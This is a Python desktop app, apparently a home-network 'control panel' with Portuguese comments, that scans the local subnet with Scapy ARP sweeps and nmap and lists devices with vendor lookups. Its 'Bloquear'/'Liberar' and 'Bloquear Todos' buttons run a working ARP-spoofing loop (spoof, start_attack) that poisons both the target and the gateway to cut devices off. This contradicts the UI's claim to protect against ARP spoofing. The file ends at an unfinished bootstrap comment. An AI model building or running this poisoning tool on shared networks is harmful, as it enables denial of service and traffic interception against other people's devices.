import flet as ft
import asyncio
import socket
import threading
import time
import subprocess
import json
import os
import ipaddress
import itertools
import re
import concurrent.futures

# Dependências de rede
import ifaddr
from scapy.all import ARP, Ether, srp, send, conf

# =====================================================================
# Configurações e cache global
# =====================================================================
conf.verb = 0   # Menos ruído do Scapy
VENDOR_CACHE_FILE = "mac_vendor_cache.json"
IEEE_OUI_URL = "https://standards-oui.ieee.org/oui/oui.txt"

CURRENT_IFACE = None
CURRENT_SUBNET = None   # ipaddress.IPv4Network
NMAP_BIN = None
VENDOR_CACHE = {}

# =====================================================================
# Utilidades de rede e detecção de ambiente
# =====================================================================

def detect_active_interface_and_subnet():
    """Descobre interface ativa e sub-rede usando ifaddr.
    - Interface: a que contém o IP local obtido via rota (UDP 8.8.8.8)
    - Sub-rede: derivada do prefixo do endereço
    - Gateway: heurística .1 do segmento (mantém compatibilidade)
    """
    try:
        import ipaddress
        local_ip = get_local_ip()
        chosen_adapter = None
        chosen_ip = None
        prefix = None

        for adapter in ifaddr.get_adapters():
            for ip in adapter.ips:
                # Ignora IPv6 (em ifaddr, IPv6 pode vir como tupla)
                if isinstance(ip.ip, tuple):
                    continue
                if ip.ip == local_ip:
                    chosen_adapter = adapter
                    chosen_ip = ip.ip
                    prefix = ip.network_prefix
                    break
            if chosen_adapter:
                break

        if chosen_adapter and chosen_ip and prefix is not None:
            subnet = ipaddress.ip_network(f"{chosen_ip}/{prefix}", strict=False)
            gw_ip = ".".join(chosen_ip.split(".")[:-1]) + ".1"
            iface_name = getattr(chosen_adapter, "nice_name", getattr(chosen_adapter, "name", None))
            return iface_name, gw_ip, subnet

        # Fallback: usa apenas o IP local e assume /24
        gw_ip = ".".join(local_ip.split("." )[:-1]) + ".1"
        try:
            subnet = ipaddress.ip_network(".".join(local_ip.split(".")[:-1]) + ".0/24", strict=False)
        except Exception:
            subnet = None
        # tentar pegar nome da interface pelo ifaddr
        iface_name = None
        for adapter in ifaddr.get_adapters():
            for ip in adapter.ips:
                if not isinstance(ip.ip, tuple) and ip.ip == local_ip:
                    iface_name = getattr(adapter, "nice_name", getattr(adapter, "name", None))
                    break
            if iface_name:
                break
        return iface_name, gw_ip, subnet
    except Exception:
        return None, None, None


def get_local_ip():
    """Obtém IP local preferindo rota real (UDP)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip


def resolve_nmap_binary():
    """Resolve o binário do nmap presente no PATH (Windows/Linux)."""
    candidates = ["nmap"]
    for c in candidates:
        try:
            r = subprocess.run([c, "-V"], capture_output=True, text=True, timeout=3)
            if r.returncode == 0 or r.stdout or r.stderr:
                return c
        except Exception:
            continue
    return None

# =====================================================================
# Vendor cache (OUI -> fabricante)
# =====================================================================

def load_vendor_cache():
    global VENDOR_CACHE
    if os.path.exists(VENDOR_CACHE_FILE):
        try:
            with open(VENDOR_CACHE_FILE, "r", encoding="utf-8") as f:
                VENDOR_CACHE = json.load(f)
        except Exception:
            VENDOR_CACHE = {}
    else:
        VENDOR_CACHE = {}


def save_vendor_cache():
    try:
        with open(VENDOR_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(VENDOR_CACHE, f, indent=2, ensure_ascii=False)
    except Exception:
        pass


def update_vendor_cache_from_ieee() -> int:
    """Baixa a base OUI da IEEE e atualiza o cache. Retorna quantas entradas novas foram lidas."""
    import requests
    try:
        resp = requests.get(IEEE_OUI_URL, timeout=30)
        resp.raise_for_status()
        lines = resp.text.splitlines()
        added = 0
        for line in lines:
            if "(hex)" in line:
                parts = line.split("(hex)")
                if len(parts) > 1:
                    oui_mac = parts[0].strip().replace("-", ":").upper()   # AA:BB:CC
                    company = parts[1].strip()
                    if oui_mac and company:
                        if VENDOR_CACHE.get(oui_mac) != company:
                            VENDOR_CACHE[oui_mac] = company
                            added += 1
        save_vendor_cache()
        return added
    except Exception:
        return 0


def vendor_from_cache_only(mac: str) -> str:
    if not mac or len(mac) < 8:
        return "Desconhecido"
    oui = ":".join(mac.replace("-", ":").upper().split(":")[:3])
    return VENDOR_CACHE.get(oui, "Desconhecido")

# =====================================================================
# Funções de varredura (mantendo nomes compatíveis com seu código)
# =====================================================================

def robust_get_mac(ip: str, iface: str, retries=5, initial_timeout=1.0):
    """Resolve MAC por ARP com múltiplas tentativas e timeout incremental."""
    if not iface:
        return None
    for i in range(retries):
        try:
            answered, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                timeout=initial_timeout + i*0.3,
                retry=1,
                verbose=0,
                iface=iface,
            )
            for _, r in answered:
                return r[Ether].src
        except Exception:
            pass
        time.sleep(0.05)
    return None


def get_gateway_ip():
    """Mantém a assinatura: usa heurística baseada no IP local (sem netifaces)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return ".".join(local_ip.split('.')[:-1]) + ".1"
    except Exception:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            return ".".join(local_ip.split('.')[:-1]) + ".1"
        except Exception:
            return "192.168.1.1"


def get_mac(ip):
    """Mantém o nome/assinatura do seu código. Usa a interface atual se existir."""
    iface = CURRENT_IFACE
    mac = robust_get_mac(ip, iface, retries=5, initial_timeout=0.8)
    return mac


def scan_network_base(network_range, iface, nmap_bin=None):
    """Descoberta rápida: ARP sweep (Scapy) + Nmap -sn (quando disponível). Retorna [{'ip','mac'}]."""
    devices = []
    # 1) ARP sweep
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(network_range))
        result = srp(pkt, timeout=3, iface=iface, verbose=0)[0]
        for _, rec in result:
            devices.append({"ip": rec.psrc, "mac": rec.hwsrc})
    except Exception:
        pass

    # 2) Complemento Nmap -sn
    if nmap_bin:
        try:
            r = subprocess.run([nmap_bin, "-sn", "-T4", str(network_range)],
                               capture_output=True, text=True, timeout=60, check=True)
            lines = r.stdout.splitlines()
            current_ip = None
            for line in lines:
                if "Nmap scan report for" in line:
                    try:
                        current_ip = line.split("for ")[1].split(" ")[0].strip("()") if "(" in line else line.split("for ")[1].strip()
                    except Exception:
                        current_ip = None
                elif "MAC Address:" in line and current_ip:
                    mac = line.split("MAC Address: ")[1].split(" ")[0]
                    found = False
                    for d in devices:
                        if d["ip"] == current_ip:
                            if not d.get("mac") or d["mac"] in ("", "Desconhecido"):
                                d["mac"] = mac
                            found = True
                            break
                    if not found:
                        devices.append({"ip": current_ip, "mac": mac})
                    current_ip = None
                elif current_ip and not any(d["ip"] == current_ip for d in devices):
                    devices.append({"ip": current_ip, "mac": "Desconhecido"})
                    current_ip = None
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

    return devices


def scan_network(network: str):
    """Mantém o nome/assinatura original do seu código: escaneia a rede e retorna devices."""
    try:
        iface = CURRENT_IFACE
        nmap_bin = NMAP_BIN
        # Converte string CIDR em objeto IPv4Network se possível
        try:
            net = ipaddress.ip_network(network, strict=False)
        except Exception:
            # fallback para /24
            base = network.split("/")[0].rsplit(".", 1)[0] + ".0/24"
            net = ipaddress.ip_network(base, strict=False)
        return scan_network_base(net, iface, nmap_bin)
    except Exception:
        return []


def get_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "Desconhecido"

# =====================================================================
# Frontend: App Flet (mantendo Bloquear/Liberar igual ao seu modelo)
# =====================================================================

class NetworkControlApp:
    def __init__(self, page: ft.Page):
        global CURRENT_IFACE, CURRENT_SUBNET, NMAP_BIN

        self.page = page
        self.page.title = "Painel de Controle da Rede"
        self.page.theme_mode = ft.ThemeMode.DARK
        self.page.bgcolor = "#111827"   # bg-gray-900
        self.page.padding = ft.padding.all(0)
        self.page.fonts = {"Inter": "https://rsms.me/inter/font-files/Inter-Regular.otf?v=3.19"}
        self.page.theme = ft.Theme(font_family="Inter")
        self.page.window_min_width = 600
        self.page.window_min_height = 720

        # Estado
        self.attacking = {}                     # ip -> bool
        self.all_devices = []                  # lista de dicts de dispositivos
        self.device_index = {}                # ip -> dict (acesso/atualização rápida)
        self.stop_scan_requested = False
        self.scanning = False
        self.attack_events = {}  # ip -> threading.Event


        # --- POOLS DE THREADS PARA PARALELISMO (ADICIONADO) ---
        self.arp_executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=min(12, max(4, (os.cpu_count() or 4)))
        )
        self.dns_executor = concurrent.futures.ThreadPoolExecutor(max_workers=6)

        # Descoberta de interface/sub-rede/gateway e Nmap
        iface, gw_ip, subnet = detect_active_interface_and_subnet()
        CURRENT_IFACE = iface
        CURRENT_SUBNET = subnet
        NMAP_BIN = resolve_nmap_binary()

        self.local_ip = get_local_ip()
        self.gateway_ip = gw_ip or get_gateway_ip()

        load_vendor_cache()

        # Controles de UI
        self.search_field = ft.TextField(
            hint_text="Buscar por IP, MAC, nome, ou fabricante...",
            prefix_icon=ft.icons.SEARCH,
            border_color="#374151",
            focused_border_color="#3b82f6",
            border_radius=20,
            height=40,
            content_padding=ft.padding.symmetric(horizontal=12),
            on_change=self.filter_devices,  # [ADICIONADO] filtra ao digitar
        )

        self.scan_toggle_button = ft.ElevatedButton(
            content=ft.Row(
                [
                    ft.Icon(ft.icons.WIFI, size=20),
                    ft.Text("Escanear Rede", weight=ft.FontWeight.W_600),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            on_click=self.toggle_scan,
            height=40,
            style=ft.ButtonStyle(
                bgcolor="#2563eb",
                color="white",
                shape=ft.RoundedRectangleBorder(radius=20),
                padding=ft.padding.symmetric(horizontal=16),
            ),
        )

        self.update_oui_button = ft.ElevatedButton(
            content=ft.Row(
                [
                    ft.Icon(ft.icons.DOWNLOAD, size=20),
                    ft.Text("Atualizar base OUI (IEEE)", weight=ft.FontWeight.W_600),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            on_click=self.update_oui_cache,
            height=40,
            style=ft.ButtonStyle(
                bgcolor="#374151", 
                color="#60a5fa",
                shape=ft.RoundedRectangleBorder(radius=20),
                padding=ft.padding.symmetric(horizontal=16),
            ),
        )

        # [ADICIONADO] Botão "Adicionar IP" + diálogo
        self.add_ip_button = ft.ElevatedButton(
            content=ft.Row(
                [
                    ft.Icon(ft.icons.ADD_CIRCLE_OUTLINE, size=20),
                    ft.Text("Adicionar IP", weight=ft.FontWeight.W_600),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            on_click=self.open_manual_ip_dialog,
            height=40,
            style=ft.ButtonStyle(
                bgcolor="#374151",
                color="white",
                shape=ft.RoundedRectangleBorder(radius=20),
                padding=ft.padding.symmetric(horizontal=16),
            ),
        )

        self.manual_ip_field = ft.TextField(
            label="Endereço IP",
            hint_text="Ex.: 192.168.1.42",
            keyboard_type=ft.KeyboardType.NUMBER,
            autofocus=True,
        )
        self.manual_ip_dialog = ft.AlertDialog(
            modal=True,
            title=ft.Text("Adicionar dispositivo por IP"),
            content=ft.Column(
                [
                    self.manual_ip_field,
                    ft.Text(
                        "Vamos tentar resolver MAC e hostname automaticamente.",
                        size=12,
                        color=ft.colors.GREY_400,
                    ),
                ],
                spacing=10,
                tight=True,
            ),
            actions=[
                ft.TextButton("Cancelar", on_click=self.cancel_manual_ip_dialog),
                ft.ElevatedButton("Adicionar", on_click=self.confirm_manual_ip_dialog),
            ],
            actions_alignment=ft.MainAxisAlignment.END,
        )

        self.block_all_button = self.create_mass_action_button(
            "Bloquear Todos", ft.icons.SHIELD_OUTLINED, "#f87171", self.mass_block
        )
        self.unblock_all_button = self.create_mass_action_button(
            "Liberar Todos", ft.icons.SHIELD, "#4ade80", self.mass_unblock
        )

        self.scan_progress = ft.ProgressBar(value=0, height=6, bgcolor="#1f2937")
        self.scan_status = ft.Text("Pronto", size=12, color=ft.colors.GREY_400)

        self.devices_list_view = ft.ListView(expand=True, spacing=4, padding=ft.padding.symmetric(horizontal=8))

        self.build_layout()
        self.page.run_task(self.initial_scan)

    # ---------------- UI helpers ----------------
    def create_mass_action_button(self, text, icon, color, on_click):
        return ft.TextButton(
            content=ft.Row([ft.Icon(icon, size=16, color=color), ft.Text(text, size=12, color=color)]),
            on_click=on_click,
            style=ft.ButtonStyle(overlay_color=ft.colors.with_opacity(0.1, color)),
        )

    def build_layout(self):
        header = ft.Container(
            content=ft.Column([
                ft.Text("Painel de Controle da Rede", size=28, weight=ft.FontWeight.BOLD),
                ft.Text("Gerencie dispositivos e proteja sua rede contra ARP Spoofing.", color=ft.colors.GREY_400),
            ]),
            padding=ft.padding.only(top=20, left=20, right=20, bottom=10),
        )

        actions = ft.Container(
            content=ft.Column(
                [
                    ft.Container(self.search_field, padding=ft.padding.symmetric(vertical=5)),
                    ft.ResponsiveRow(
                        [
                            ft.Container(self.scan_toggle_button, col={"xs": 12, "sm": 4}),   # was 6
                            ft.Container(self.update_oui_button, col={"xs": 12, "sm": 4}),    # was 6
                            ft.Container(self.add_ip_button,     col={"xs": 12, "sm": 4}),    # [ADICIONADO]
                        ],
                    ),
                ],
            ),
            padding=ft.padding.symmetric(horizontal=20, vertical=10),
        )

        devices_card = ft.Container(
            expand=True,
            content=ft.Column([
                ft.Container(
                    content=ft.Row([
                        ft.Text("Dispositivos Conectados", weight=ft.FontWeight.W_600, size=16),
                        ft.Row([self.block_all_button, self.unblock_all_button]),
                    ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
                    padding=ft.padding.only(left=16, right=8, top=12, bottom=8),
                    border=ft.border.only(bottom=ft.border.BorderSide(width=1, color="#374151")),
                ),
                ft.Container(self.scan_progress, padding=ft.padding.symmetric(horizontal=16)),
                ft.Container(self.scan_status, padding=ft.padding.only(left=16, right=16, bottom=8)),
                self.devices_list_view,
            ]),
            bgcolor="#1f2937",   # bg-gray-800
            border=ft.border.all(width=1, color="#374151"),   # border-gray-700
            border_radius=12,
            margin=ft.margin.all(20),
            shadow=ft.BoxShadow(
                spread_radius=1,
                blur_radius=15,
                color=ft.colors.with_opacity(0.2, "black"),
                offset=ft.Offset(0, 5),
            ),
        )

        self.page.add(ft.Container(expand=True, content=ft.Column([header, actions, devices_card])))

    # [ADICIONADO] — diálogo de IP manual
    def open_manual_ip_dialog(self, e):
        self.manual_ip_field.value = ""
        self.page.dialog = self.manual_ip_dialog
        self.manual_ip_dialog.open = True
        self.page.update()

    def cancel_manual_ip_dialog(self, e):
        self.manual_ip_dialog.open = False
        self.page.update()

    async def _add_manual_ip(self, ip_str: str):
        # valida IP
        try:
            ipaddress.ip_address(ip_str)
        except Exception:
            self._snack("IP inválido. Ex.: 192.168.1.42")
            return

        # evita duplicidade óbvia
        if ip_str in self.device_index:
            # ainda tenta enriquecer hostname/MAC se estiver "Desconhecido"
            mac = await asyncio.to_thread(get_mac, ip_str)
            if mac:
                self.add_or_update_device(ip_str, mac=mac)
            asyncio.get_running_loop().create_task(self._resolve_hostname_async(ip_str))
            self._snack("IP já listado. Atualizando dados…")
            return

        # resolve MAC/hostname sem travar UI
        mac = await asyncio.to_thread(get_mac, ip_str)
        self.add_or_update_device(ip_str, mac=mac)
        asyncio.get_running_loop().create_task(self._resolve_hostname_async(ip_str))
        self._snack(f"Dispositivo {ip_str} adicionado.")

    def _snack(self, msg: str):
        self.page.snack_bar = ft.SnackBar(ft.Text(msg))
        self.page.snack_bar.open = True
        self.page.update()

    async def confirm_manual_ip_dialog(self, e):
        ip_str = (self.manual_ip_field.value or "").strip()
        await self._add_manual_ip(ip_str)
        self.manual_ip_dialog.open = False
        self.page.update()

    def create_device_card(self, device):
        ip = device['ip']
        mac = device['mac']
        status = device['status']
        hostname = device.get('hostname', 'Desconhecido')
        vendor = device.get('vendor', 'Desconhecido')

        # Ícone por status/tipo
        if status == 'Gateway Padrão':
            icon_name = ft.icons.ROUTER_OUTLINED
            icon_color = "#60a5fa"
            icon_bg = "#1e40af"
        elif status == 'Este Dispositivo':
            icon_name = ft.icons.LAPTOP_MAC_OUTLINED
            icon_color = "#a78bfa"
            icon_bg = "#4338ca"
        elif status == 'Bloqueado':
            icon_name = ft.icons.NO_CELL_OUTLINED
            icon_color = "#f87171"
            icon_bg = "#991b1b"
        else:   # Conectado
            icon_name = ft.icons.DEVICE_UNKNOWN
            icon_color = "#4ade80"
            icon_bg = "#166534"

        device_icon = ft.Container(
            content=ft.Icon(name=icon_name, color=icon_color),
            width=48, height=48,
            bgcolor=icon_bg,
            border_radius=24,
            alignment=ft.alignment.center,
        )

        # Badge de Status
        if status == 'Conectado':
            status_badge = ft.Row([
                ft.Container(width=8, height=8, bgcolor="#4ade80", border_radius=4),
                ft.Text("Conectado", color="#4ade80", size=12),
            ])
        elif status == 'Bloqueado':
            status_badge = ft.Row([
                ft.Container(width=8, height=8, bgcolor="#f87171", border_radius=4),
                ft.Text("Bloqueado", color="#f87171", size=12),
            ])
        else:
            status_badge = ft.Text(status, color="#a78bfa", size=12, weight=ft.FontWeight.W_600)

        # Botão de ação
        action_button = ft.Container()
        if status not in ['Gateway Padrão', 'Este Dispositivo']:
            is_blocked = status == 'Bloqueado'
            btn_text = "Liberar" if is_blocked else "Bloquear"
            btn_icon = ft.icons.CHECK_CIRCLE_OUTLINE if is_blocked else ft.icons.BLOCK
            btn_bgcolor = "#16a34a" if is_blocked else "#4b5563"

            action_button = ft.ElevatedButton(
                text=btn_text,
                icon=btn_icon,
                on_click=lambda _, d=device: self.toggle_device_attack(d),
                height=38,
                width=120,  # largura fixa para padronizar Bloquear/Liberar
                style=ft.ButtonStyle(
                    bgcolor=btn_bgcolor,
                    color="white",
                    shape=ft.RoundedRectangleBorder(radius=20),
                    padding=ft.padding.symmetric(horizontal=12),  # já conta espaço do ícone
                ),
            )


        left = ft.Container(
            content=ft.Row([
                device_icon,
                ft.Column([
                    ft.Text(ip, weight=ft.FontWeight.BOLD, size=15),
                    ft.Text(hostname, color=ft.colors.GREY_400, size=12),
                    ft.Text(mac, color=ft.colors.GREY_500, size=12, font_family="monospace"),
                    ft.Text(vendor, color=ft.colors.GREY_500, size=12),
                ], spacing=2),
            ]),
            col={"xs": 12, "sm": 7},
        )

        right = ft.Container(
            content=ft.Row([status_badge, action_button], alignment=ft.MainAxisAlignment.END, spacing=12),
            alignment=ft.alignment.center_right,
            col={"xs": 12, "sm": 5},
        )

        card_content = ft.ResponsiveRow(
            [left, right],
            vertical_alignment=ft.CrossAxisAlignment.CENTER,
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
        )

        return ft.Container(
            content=card_content,
            padding=ft.padding.all(12),
            border_radius=12,
            ink=True,
            bgcolor=ft.colors.with_opacity(0.02, ft.colors.WHITE) if status != 'Este Dispositivo' else ft.colors.with_opacity(0.1, "#a78bfa"),
            data=device,
        )

    def update_device_list(self, devices_to_display):
        # Ordenação: gateway -> local -> demais por IP
        def sort_key(d):
            ip = d['ip']
            if ip == self.gateway_ip:
                return (0,)
            if ip == self.local_ip:
                return (1,)
            try:
                return (2, tuple(int(p) for p in ip.split('.')))
            except Exception:
                return (2, (999, 999, 999, 999))

        sorted_devices = sorted(devices_to_display, key=sort_key)
        self.devices_list_view.controls.clear()
        for device in sorted_devices:
            self.devices_list_view.controls.append(self.create_device_card(device))
        self.page.update()

    # ---------- Helpers de atualização incremental ----------
    def add_or_update_device(self, ip: str, mac: str | None = None,
                             hostname: str | None = None, vendor: str | None = None):
        status = (
            'Gateway Padrão' if ip == self.gateway_ip else
            ('Este Dispositivo' if ip == self.local_ip else ('Bloqueado' if self.attacking.get(ip) else 'Conectado'))
        )

        if ip in self.device_index:
            d = self.device_index[ip]
            if mac and (d['mac'] in ('Desconhecido', '??:??:??:??:??:??') or d['mac'] != mac):
                d['mac'] = mac
                d['vendor'] = vendor or vendor_from_cache_only(mac)
            if hostname and (d['hostname'] == 'Desconhecido'):
                d['hostname'] = hostname
            d['status'] = status
        else:
            d = {
                'ip': ip,
                'mac': mac or 'Desconhecido',
                'hostname': hostname or 'Desconhecido',
                'vendor': vendor or (vendor_from_cache_only(mac) if mac else 'Desconhecido'),
                'status': status,
            }
            self.all_devices.append(d)
            self.device_index[ip] = d

        # Reaplica filtro e re-renderiza
        self.filter_devices(None)

    def _arp_chunk_scan(self, ips):
        """Executa ARP para um pequeno lote de IPs e retorna [(ip, mac)]."""
        if self.stop_scan_requested:
            return []

        try:
            packets = [Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip) for ip in ips]
            answered, _ = srp(
                packets,
                timeout=0.3,  # bem curto para parar rápido
                iface=CURRENT_IFACE,
                verbose=0,
            )
            if self.stop_scan_requested:
                return []
            return [(r.psrc, r.hwsrc) for _, r in answered]
        except Exception:
            return []

    async def _nmap_stream_supplement(self, network_cidr: str):
        """Roda nmap -sn em modo streaming, enriquecendo MAC/vendor conforme linhas chegam."""
        if not NMAP_BIN or self.stop_scan_requested:
            return
        try:
            proc = await asyncio.create_subprocess_exec(
                NMAP_BIN, "-sn", "-T4", network_cidr,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            current_ip = None

            while True:
                if self.stop_scan_requested:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    return  # sai na hora

                line = await proc.stdout.readline()
                if not line:
                    break
                s = line.decode(errors="ignore").strip()

                if "Nmap scan report for" in s:
                    m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)", s)
                    if m:
                        current_ip = m.group(1)
                    else:
                        try:
                            current_ip = s.split("for", 1)[1].strip().split()[-1]
                        except Exception:
                            current_ip = None
                    if current_ip:
                        self.add_or_update_device(current_ip)

                elif "MAC Address:" in s and current_ip:
                    try:
                        mac = s.split("MAC Address: ")[1].split()[0]
                        self.add_or_update_device(current_ip, mac=mac)
                    except Exception:
                        pass
                    finally:
                        current_ip = None

                self.scan_status.value = f"Complementando com Nmap… {len(self.all_devices)} dispositivos"
                self.page.update()

            try:
                await proc.wait()
            except Exception:
                pass
        except Exception:
            return


    # ---------- RESOLUÇÃO DE HOSTNAME ASSÍNCRONA (ADICIONADO) ----------
    async def _resolve_hostname_async(self, ip: str, timeout: float = 0.75):
        loop = asyncio.get_running_loop()
        try:
            hostname = await asyncio.wait_for(
                loop.run_in_executor(self.dns_executor, get_hostname, ip),
                timeout=timeout,
            )
        except Exception:
            hostname = None
        if hostname and not self.stop_scan_requested:
            self.add_or_update_device(ip, hostname=hostname)

    # ---------------- Ações ----------------
    async def toggle_scan(self, e):
        if not self.scanning:
            # Iniciar
            self.scanning = True
            self.stop_scan_requested = False
            self.scan_toggle_button.content.controls[0].name = ft.icons.STOP_CIRCLE
            self.scan_toggle_button.content.controls[1].value = "Parar Scan"
            self.scan_toggle_button.style.bgcolor = "#dc2626"
            self.scan_toggle_button.style.shape = ft.RoundedRectangleBorder(radius=20)
            self.scan_status.value = "Escaneando..."
            self.scan_progress.value = None   # indeterminado durante preparação
            self.page.update()

            await self.run_scan_task()

            # Finalizar
            self.scanning = False
            self.scan_toggle_button.content.controls[0].name = ft.icons.WIFI
            self.scan_toggle_button.content.controls[1].value = "Escanear Rede"
            self.scan_toggle_button.style.bgcolor = "#2563eb"
            self.scan_toggle_button.style.shape = ft.RoundedRectangleBorder(radius=20)
            self.scan_status.value = "Pronto"
            self.scan_progress.value = 0
            self.page.update()
        else:
            # Parar
            self.stop_scan_requested = True

    async def run_scan_task(self):
        """
        Fluxo de scan com parada imediata:
        - Adiciona gateway/local
        - Cancela todos os futures ao parar
        - Mata Nmap sem esperar
        """
        try:
            self.all_devices.clear()
            self.device_index.clear()
            self.devices_list_view.controls.clear()
            self.page.update()

            if CURRENT_SUBNET is not None:
                network_cidr = str(CURRENT_SUBNET)
            else:
                network_cidr = f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"

            for special_ip in [self.gateway_ip, self.local_ip]:
                if special_ip:
                    mac = await asyncio.to_thread(get_mac, special_ip)
                    self.add_or_update_device(special_ip, mac=mac)

            try:
                net = ipaddress.ip_network(network_cidr, strict=False)
                hosts = [str(h) for h in net.hosts()]
            except Exception:
                base = f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"
                net = ipaddress.ip_network(base, strict=False)
                hosts = [str(h) for h in net.hosts()]

            hosts = [h for h in hosts if h not in (self.local_ip, self.gateway_ip)]
            total = len(hosts)
            processed = 0

            CHUNK_SIZE = 32
            loop = asyncio.get_running_loop()
            chunks = [hosts[i:i + CHUNK_SIZE] for i in range(0, total, CHUNK_SIZE)]
            total_chunks = len(chunks)
            processed_chunks = 0

            future_map = {}
            for chunk in chunks:
                if self.stop_scan_requested:
                    return
                fut = loop.run_in_executor(self.arp_executor, self._arp_chunk_scan, chunk)
                future_map[fut] = len(chunk)

            pending = list(future_map.keys())
            active = []
            MAX_CONCURRENT_CHUNKS = min(12, max(4, (os.cpu_count() or 4)))

            while pending or active:
                while pending and len(active) < MAX_CONCURRENT_CHUNKS:
                    fut = pending.pop(0)
                    active.append(fut)

                if self.stop_scan_requested:
                    # Mata todas as tasks ativas imediatamente
                    for fut in active:
                        fut.cancel()
                    return

                done, not_done = await asyncio.wait(
                    active,
                    return_when=asyncio.FIRST_COMPLETED,
                )

                for fut in done:
                    try:
                        active.remove(fut)
                    except ValueError:
                        pass

                    if self.stop_scan_requested:
                        return

                    try:
                        results = fut.result()
                    except Exception:
                        results = []

                    processed += future_map.get(fut, CHUNK_SIZE)
                    processed_chunks += 1

                    for ip, mac in results:
                        if self.stop_scan_requested:
                            return
                        self.add_or_update_device(ip, mac=mac)
                        loop.create_task(self._resolve_hostname_async(ip))

                    self.scan_status.value = (
                        f"Escaneando… {len(self.all_devices)} dispositivos • "
                        f"{min(processed, total)}/{total} IPs • "
                        f"{processed_chunks}/{total_chunks} lotes"
                    )
                    self.scan_progress.value = (min(processed, total) / total) if total else 0
                    self.page.update()

            if NMAP_BIN and not self.stop_scan_requested:
                await self._nmap_stream_supplement(network_cidr)

        finally:
            self.page.update()

    def filter_devices(self, e):
        term = (self.search_field.value or "").lower()
        if not term:
            self.update_device_list(self.all_devices)
            return
        filtered = []
        for d in self.all_devices:
            if (
                term in d['ip'].lower() or
                term in (d['mac'] or '').lower() or
                term in (d.get('hostname') or '').lower() or
                term in (d.get('vendor') or '').lower()
            ):
                filtered.append(d)
        self.update_device_list(filtered)

    def toggle_device_attack(self, device):
        # Mantém exatamente o comportamento do seu modelo (executa ARP spoof/restore)
        ip_to_toggle = device['ip']
        is_currently_attacking = self.attacking.get(ip_to_toggle, False)

        if is_currently_attacking:
            self.stop_attack(ip_to_toggle, self.gateway_ip)
            device['status'] = 'Conectado'
        else:
            self.start_attack(ip_to_toggle, self.gateway_ip)
            device['status'] = 'Bloqueado'

        # Reflete imediatamente na lista filtrada
        self.filter_devices(None)

    def mass_block(self, e):
        for device in self.all_devices:
            if device['status'] == 'Conectado' and device['ip'] not in (self.gateway_ip, self.local_ip):
                self.toggle_device_attack(device)

    def mass_unblock(self, e):
        for device in self.all_devices:
            if device['status'] == 'Bloqueado' and device['ip'] not in (self.gateway_ip, self.local_ip):
                self.toggle_device_attack(device)

    async def initial_scan(self):
        await self.run_scan_task()

    # ---------------- OUI cache actions ----------------
    def update_oui_cache(self, e):
        self.scan_status.value = "Baixando base OUI da IEEE..."
        self.scan_progress.value = None
        self.page.update()

        def _task():
            added = update_vendor_cache_from_ieee()
            return added

        def _done(fut: asyncio.Future):
            added = fut.result()
            self.scan_status.value = f"Base OUI atualizada (+{added} entradas)."
            self.scan_progress.value = 0
            self.page.update()

        fut = self.page.run_task(asyncio.to_thread, _task)
        fut.add_done_callback(_done)

    # =====================================================================
    # Funções de ataque e restauração (agora como métodos da classe)
    # =====================================================================
    def spoof(self, target_ip, spoof_ip, target_mac):
        """Envia ARP Reply para envenenar o alvo, usando um MAC conhecido."""
        if target_mac:
            try:
                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                send(packet, verbose=False, iface=CURRENT_IFACE)
            except Exception:
                pass

    def restore(self, target_ip, source_ip, target_mac, source_mac):
        """
        Restaura o ARP usando os MACs corretos do cache local.
        Não chama get_mac.
        """
        if target_mac and source_mac:
            try:
                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
                send(packet, count=6, verbose=False, iface=CURRENT_IFACE)
            except Exception:
                pass

    def start_attack(self, target_ip, gateway_ip):
        """
        Inicia spoofing com evento de parada imediata.
        """
        target_device = self.device_index.get(target_ip)
        gateway_device = self.device_index.get(gateway_ip)

        if not target_device or not gateway_device or not target_device.get('mac') or not gateway_device.get('mac'):
            return

        target_mac = target_device['mac']
        gateway_mac = gateway_device['mac']

        stop_event = threading.Event()
        self.attack_events[target_ip] = stop_event
        self.attacking[target_ip] = True

        def attack_loop():
            while not stop_event.is_set():
                self.spoof(target_ip, gateway_ip, target_mac)
                self.spoof(gateway_ip, target_ip, gateway_mac)
                # espera, mas pode ser interrompido
                stop_event.wait(timeout=2)

        thread = threading.Thread(target=attack_loop, daemon=True)
        thread.start()

    def stop_attack(self, target_ip, gateway_ip):
        """
        Para o ataque imediatamente usando Event.
        """
        if target_ip in self.attacking:
            self.attacking[target_ip] = False

            stop_event = self.attack_events.get(target_ip)
            if stop_event:
                stop_event.set()  # acorda a thread imediatamente
                del self.attack_events[target_ip]

            target_device = self.device_index.get(target_ip)
            gateway_device = self.device_index.get(gateway_ip)

            if target_device and gateway_device:
                target_mac = target_device.get('mac')
                gateway_mac = gateway_device.get('mac')
                self.restore(target_ip, gateway_ip, target_mac, gateway_mac)
                self.restore(gateway_ip, target_ip, gateway_mac, target_mac)


# =====================================================================
# Bootstrap Flet
